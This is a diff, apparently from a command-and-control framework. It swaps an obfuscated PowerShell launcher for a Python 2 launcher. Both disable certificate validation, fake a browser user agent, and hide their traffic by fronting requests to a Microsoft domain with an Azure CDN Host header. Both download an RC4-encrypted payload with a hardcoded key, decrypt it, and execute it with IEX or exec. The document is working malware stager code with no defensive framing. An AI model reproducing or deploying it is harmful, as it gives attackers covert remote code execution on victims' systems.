@@ -1,1 +1,22 @@
-powershell -W h $ErrorActionPreference = ('S'+'ilentlyC'+'ont'+'inue');$WC=New-OBJeCT SyStEM.NEt.WEbCliENt;$u=('Mozilla/5'+'.0 (Wi'+'nd'+'ows '+'NT 10.0; W'+'in64'+';'+' x'+'64) A'+'ppleWe'+'b'+'Kit/5'+'37.'+'36 (K'+'H'+'T'+'M'+'L'+' like '+'Gecko) Chro'+'m'+'e/'+'51'+'.0'+'.27'+'04.79'+' '+'S'+'af'+'ar'+'i/'+'537'+'.36 E'+'dge/14.1'+'4'+'9'+'3'+'1');[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HeAdERs.ADd(('User'+'-'+'Agent'),$u);$wC.PROxy=[SYstEM.NEt.WEBREQuEST]::DEfauLTWEbPRoxy;$wc.ProxY.CrEdentialS = [SySTEM.Net.CREDeNTiALCacHE]::DEfAultNEtwOrkCrEdeNTIaLS;$Script:Proxy = $wc.Proxy;$K=[SYsTEM.TexT.EncodINg]::ASCII.GEtByTES('/yi^t4}n6=|HlVNoK:1L9S{w#h0C[BZs');$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXOR$S[($S[$I]+$S[$H])%256]}};$ser=('h'+'t'+'tps:/'+'/aj'+'ax.microsoft.co'+'m:44'+'3');$t=('/l'+'ogin/pro'+'cess.p'+'hp');trY{$iG=$WC.DOwnloAdDAtA($sER)}cATch{};$wc.HeADeRS.ADD(('Hos'+'t'),(' conte'+'nt-t'+'rack'+'er.azure'+'ed'+'ge.net'));$wc.HEADeRS.ADD(('Cooki'+'e'),('s'+'e'+'ssi'+'o'+'n=HG8aq'+'jclIM/OJd60QH'+'/Vk'+'CSg'+'85'+'M'+'='));$dAta=$WC.DoWNLoAdData($ser+$t);$iV=$DAtA[0..3];$dAta=$daTA[4..$DaTa.leNGtH];-join[Char[]](& $R $DaTA ($IV+$K))|IEX
+import sys;import ssl;
+if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
+import urllib2;
+UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931';server='https://ajax.microsoft.com:443';t='/admin/get.php';req=urllib2.Request(server+t);
+req.add_header('User-Agent',UA);
+req.add_header("Host"," content-tracker.azureedge.net");
+req.add_header('Cookie',"fBYebJz=0Yeq24Vz0DysNwWZqyDeNsFxUHc=;");
+proxy = urllib2.ProxyHandler();
+o = urllib2.build_opener(proxy);
+urllib2.install_opener(o);
+a=urllib2.urlopen(req).read();
+IV=a[0:4];data=a[4:];key=IV+'r9JpQs<CM[,Yh5kRUBj|_v#nEi=f(8!V';S,j,out=range(256),0,[]
+for i in range(256):
+    j=(j+S[i]+ord(key[i%len(key)]))%256
+    S[i],S[j]=S[j],S[i]
+i=j=0
+for char in data:
+    i=(i+1)%256
+    j=(j+S[i])%256
+    S[i],S[j]=S[j],S[i]
+    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))
+exec(''.join(out))
